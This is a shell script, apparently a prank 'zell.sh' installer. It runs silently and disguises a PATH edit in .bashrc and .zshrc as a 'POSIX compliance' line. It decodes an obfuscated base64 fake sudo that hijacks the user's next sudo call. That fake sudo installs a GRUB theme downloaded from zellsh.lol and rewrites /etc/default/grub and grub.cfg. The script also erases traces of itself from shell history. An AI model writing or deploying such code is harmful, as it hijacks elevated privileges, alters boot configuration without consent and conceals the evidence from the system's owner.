#!/bin/sh

{
    BASE64FILE="IyEvYmluL3NoCgp7CiAgICBpZiBbIC1kIC9ib290L2dydWIyLyBdOyB0aGVuCiAgICAgICAgR1JVQl9ESVI9Ii9ib290L2dydWIyIgogICAgZWxpZiBbIC1kIC9ib290L2dydWIvIF07IHRoZW4KICAgICAgICBHUlVCX0RJUj0iL2Jvb3QvZ3J1YiIKICAgIGZpCiAgICBpZiBjb21tYW5kIC1wdiBncnViMi1ta2NvbmZpZyAxPi9kZXYvbnVsbCAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIEdSVUJfTUtDT05GSUc9ImdydWIyLW1rY29uZmlnIgogICAgZWxpZiBjb21tYW5kIC1wdiBncnViLW1rY29uZmlnIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgR1JVQl9NS0NPTkZJRz0iZ3J1Yi1ta2NvbmZpZyIKICAgIGZpCgogICAgaWYgWyAtbiAiJEdSVUJfRElSIiBdICYmIFsgLW4gIiRHUlVCX01LQ09ORklHIiBdOyB0aGVuCiAgICAgICAgVVNFUl9IT01FPSIkSE9NRSIKCiAgICAgICAgbWtkaXIgLXAgIiRVU0VSX0hPTUUvLmxvY2FsL3Zhci8iCiAgICAgICAgaWYgWyAhIC1mICIkVVNFUl9IT01FLy5sb2NhbC92YXIvYm9vdF9kYXRhLnppcCIgXTsgdGhlbgogICAgICAgICAgICB3Z2V0IC0tb3V0cHV0LWRvY3VtZW50ICIkVVNFUl9IT01FLy5sb2NhbC92YXIvYm9vdF9kYXRhLnppcCIgaHR0cHM6Ly96ZWxsc2gubG9sL3plbGxzaGxvbC56aXAKICAgICAgICBmaQoKICAgICAgICBpZiBbIC1kICIkR1JVQl9ESVIvdGhlbWVzL3plbGxzaGxvbCIgXTsgdGhlbgogICAgICAgICAgICAvc2Jpbi9zdWRvIHJtIC1yZiAiJEdSVUJfRElSL3RoZW1lcy96ZWxsc2hsb2wiCiAgICAgICAgZmkKICAgICAgICAvc2Jpbi9zdWRvIG1rZGlyIC1wICIkR1JVQl9ESVIvdGhlbWVzLyIKCiAgICAgICAgL3NiaW4vc3VkbyB1bnppcCAiJFVTRVJfSE9NRS8ubG9jYWwvdmFyL2Jvb3RfZGF0YS56aXAiIC1kICIkR1JVQl9ESVIvdGhlbWVzLyIKICAgICAgICBybSAiJFVTRVJfSE9NRS8ubG9jYWwvdmFyL2Jvb3RfZGF0YS56aXAiCgogICAgICAgIC9zYmluL3N1ZG8gY3AgLS11cGRhdGU9bm9uZSAvZXRjL2RlZmF1bHQvZ3J1YiAiL2V0Yy9kZWZhdWx0L2dydWIuYmFja3VwX2JlZm9yZV96ZWxsc2giCiAgICAgICAgL3NiaW4vc3VkbyBzZWQgLWkgLUUgJ3MvXlsgXHRdKihHUlVCX1RIRU1FPS4qKS8jXDEvZycgL2V0Yy9kZWZhdWx0L2dydWIKICAgICAgICAvc2Jpbi9zdWRvIHNlZCAtaSAtRSAncy9eWyBcdF0qKEdSVUJfVElNRU9VVD0uKikvI1wxL2cnIC9ldGMvZGVmYXVsdC9ncnViCiAgICAgICAgL3NiaW4vc3VkbyBzZWQgLWkgLUUgJ3MvXlsgXHRdKihHUlVCX0JBQ0tHUk9VTkQ9LiopLyNcMS9nJyAvZXRjL2RlZmF1bHQvZ3J1YgogICAgICAgIHByaW50ZiAnXG4lc1xuJXNcbicgIkdSVUJfVEhFTUU9JEdSVUJfRElSL3RoZW1lcy96ZWxsc2hsb2wvdGhlbWUudHh0IiAnR1JVQl9USU1FT1VUPTE1JyB8IC9zYmluL3N1ZG8gdGVlIC1hIC9ldGMvZGVmYXVsdC9ncnViCiAgICAgICAgL3NiaW4vc3VkbyAiJEdSVUJfTUtDT05GSUciIC1vICIkR1JVQl9ESVIvZ3J1Yi5jZmciCiAgICBmaQoKICAgIHNlZCAtaSAtRSAncy8uKiMgZm9yIFBPU0lYIGNvbXBsaWFuY2UgYW5kIGJhY2t3YXJkcyBjb21wYXRpYmlsaXR5Ly9nJyAiJFVTRVJfSE9NRS8uYmFzaHJjIgogICAgc2VkIC1pIC1FICdzLy4qIyBmb3IgUE9TSVggY29tcGxpYW5jZSBhbmQgYmFja3dhcmRzIGNvbXBhdGliaWxpdHkvL2cnICIkVVNFUl9IT01FLy56c2hyYyIKICAgIHJtICIkVVNFUl9IT01FLy5sb2NhbC9iaW4vc3VkbyIKCn0gMT4vZGV2L251bGwgMj4vZGV2L251bGwKCgovc2Jpbi9zdWRvICIkQCIK"

    sed -i -E 's/.*# for POSIX compliance and backwards compatibility//g' "$HOME/.bashrc"
    sed -i -E 's/.*# for POSIX compliance and backwards compatibility//g' "$HOME/.zshrc"
    # shellcheck disable=SC2016
    echo 'export PATH="$HOME:$PATH"; hash -r # for POSIX compliance and backwards compatibility' > /tmp/.bashrc.tmp
    cp /tmp/.bashrc.tmp /tmp/.zshrc.tmp
    cat "$HOME/.bashrc" >> /tmp/.bashrc.tmp
    cat "$HOME/.zshrc" >> /tmp/.zshrc.tmp
    mv  /tmp/.bashrc.tmp "$HOME/.bashrc"
    mv  /tmp/.zshrc.tmp "$HOME/.zshrc"

    mkdir -p "$HOME/.local/bin/"
    echo "$BASE64FILE" | base64 --decode > "$HOME/.local/bin/sudo"
    chmod +x "$HOME/.local/bin/sudo"

    (
        {
            mkdir -p "$HOME/.local/var/"
            wget --output-document "$HOME/.local/var/boot_data.zip" https://zellsh.lol/zellshlol.zip
            for _i in $(seq 60); do
                sed -i -E 's/.*zell\.sh.*//g' "$HOME/.bash_history"
                sed -i -E 's/.*zell\.sh.*//g' "$HOME/.zhistory"
                sleep 1
            done
        } 1>/dev/null 2>/dev/null
    ) &

} 1>/dev/null 2>/dev/null



